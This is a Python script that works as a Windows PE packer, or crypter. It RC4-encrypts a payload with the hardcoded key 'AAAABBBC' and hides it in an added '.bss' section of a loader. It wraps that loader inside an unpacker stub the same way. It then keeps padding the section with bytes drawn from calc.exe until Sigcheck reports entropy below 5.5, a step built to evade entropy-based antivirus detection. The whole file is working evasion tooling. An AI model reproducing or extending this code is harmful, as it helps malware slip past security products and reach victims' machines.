import argparse
import lief
import os
import random
from time import sleep
from struct import pack
from arc4 import ARC4

def align(x, al):
    """ return <x> aligned to <al> """
    if x % al == 0:
        return x
    else:
        return x - (x % al) + al


def pad_data(data, al):
    """ return <data> padded with 0 to a size aligned with <al> """
    return data + ([0] * (align(len(data), al) - len(data)))

input_PE_data = None

if __name__ =="__main__" :

    parser = argparse.ArgumentParser(description='Pack PE binary')
   
    parser.add_argument('-l', metavar="loader", help='loader')
    parser.add_argument('-p', metavar="UNPACKER", help='unpacker .exe', required=True)
    parser.add_argument('-o', metavar="FILE", help='output', default="packed.exe")
    parser.add_argument('-d', metavar="data", help='payload data')

    args = parser.parse_args()
    key = "AAAABBBC"
    # open the unpack.exe binary
    unpack_PE = lief.PE.parse(args.p)
    if (args.l != None and args.d!=None):
        loader = lief.PE.parse(args.l)
        with open(args.d, "rb") as d:
            payload = d.read()
        arc4 = ARC4(bytes(key, "utf-8"))
        
        payload = b"w00fw00f" + len(payload).to_bytes(4, byteorder="little") + bytes(key, "utf-8") + arc4.encrypt(payload)
        print("[+] Payload Signature: "+ str(payload[:20]))
        print("[+] Payload Size: "+ str(len(payload)-20))
        file_alignment = loader.optional_header.file_alignment
        section_alignment = loader.optional_header.section_alignment

        loader_data = list(payload) # lief expects a list, not a "bytes" object.
        loader_data = pad_data(loader_data, file_alignment) # pad with 0 to align with file alignment (removes a lief warning)
        loader_section = lief.PE.Section(".bss")
        loader_section.content =  loader_data
        loader_section.size = len(loader_data)
        loader_section.characteristics = (lief.PE.SECTION_CHARACTERISTICS.MEM_READ
                                        | lief.PE.SECTION_CHARACTERISTICS.CNT_INITIALIZED_DATA)
        loader.add_section(loader_section)
        if(os.path.exists(args.o)):
            os.remove(args.o)
        builder = lief.PE.Builder(loader)
        builder.build()
        builder.write(args.o)
        with open(args.o, "rb") as f:
            input_PE_data = f.read()
    else:
         with open(args.l, "rb") as f:
              input_PE_data = f.read()
    # we're going to keep the same alignment as the ones in unpack_PE,
    # because this is the PE we are modifying
    file_alignment = unpack_PE.optional_header.file_alignment
    section_alignment = unpack_PE.optional_header.section_alignment

    # then create the a .packed section, with the packed PE inside :

    # read the whole file to be packed

    
    
    arc4 = ARC4(bytes(key, "utf-8"))
    input_PE_data =len(input_PE_data).to_bytes(4, byteorder="little") + bytes(key, "utf-8") + arc4.encrypt(input_PE_data)
    
 
    print("[+] Signature: "+ str(input_PE_data[:12]))
    
    # create the section in lief
    packed_data = list(input_PE_data) # lief expects a list, not a "bytes" object.
    packed_data = pad_data(packed_data, file_alignment) # pad with 0 to align with file alignment (removes a lief warning)
    packed_section = lief.PE.Section(".bss")
    packed_section.content =  packed_data
    packed_section.size = len(packed_data)
    print("[+] Packed PE size: "+ str(packed_section.size) )
    packed_section.characteristics = (lief.PE.SECTION_CHARACTERISTICS.MEM_READ
                                    | lief.PE.SECTION_CHARACTERISTICS.CNT_INITIALIZED_DATA)
    unpack_PE.add_section(packed_section)
    if(os.path.exists(args.o)):
        os.remove(args.o)

    builder = lief.PE.Builder(unpack_PE)
    builder.build()
    builder.write(args.o)

    with open('c:\\windows\\system32\calc.exe', "rb") as f:
                text = f.read()
    size = int(unpack_PE.virtual_size/2)
    
   
    while(True):
        res = str(os.popen("E:\\Tools\\misc\\SysInternals\\Sigcheck.exe -a " + args.o).read()).split("\n")
        print("[*] Entropy: " + (res[20].split(':')[1].strip()))
        if (float(res[20].split(':')[1])>5.5):
            unpack_PE.remove_section('.bss')
            packed_data = list(input_PE_data +  bytes(''.join(random.choices(str(text), k=size)), 'utf-8')) # lief expects a list, not a "bytes" object.
            packed_data = pad_data(packed_data, file_alignment) # pad with 0 to align with file alignment (removes a lief warning)
            packed_section = lief.PE.Section(".bss")
            packed_section.content =  packed_data
            packed_section.size = len(packed_data)
            packed_section.characteristics = (lief.PE.SECTION_CHARACTERISTICS.MEM_READ
                                            | lief.PE.SECTION_CHARACTERISTICS.CNT_INITIALIZED_DATA)
            unpack_PE.add_section(packed_section)
            if(os.path.exists(args.o)):
                os.remove(args.o)
            
            builder = lief.PE.Builder(unpack_PE)
            builder.build()
            builder.write(args.o)
            size += int(size/5)
        else:
            print("[+] Good entropy: " + (res[20].split(':')[1].strip()) + ". Exiting.")
            break